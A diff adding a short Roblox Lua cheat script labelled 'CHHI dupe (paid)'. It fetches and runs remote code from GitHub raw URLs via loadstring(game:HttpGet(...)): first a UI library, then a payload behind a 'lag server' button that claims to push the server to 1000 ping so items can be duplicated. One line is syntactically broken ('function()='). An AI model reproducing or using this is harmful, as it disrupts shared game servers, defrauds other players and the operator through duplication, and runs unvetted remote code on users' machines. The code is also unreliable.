@@ -1,0 +1,7 @@
+local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/mikoks21/spik/main/duplic%2B"))()
+local Window = Library.CreateLib("CHHI dupe (paid)", "BloodTheme")
+local Main = Window:NewTab("Main")
+local MainSection = Main:NewSection("Dupe")
+MainSection:NewButton("lag server", "make server go to up 1000 ping to dupe selected items", function()=
+loadstring(game:HttpGet("https://raw.githubusercontent.com/mikoks21/DUPEgifts/main/ExclusiveHugeGistEgg", true))()
+end)
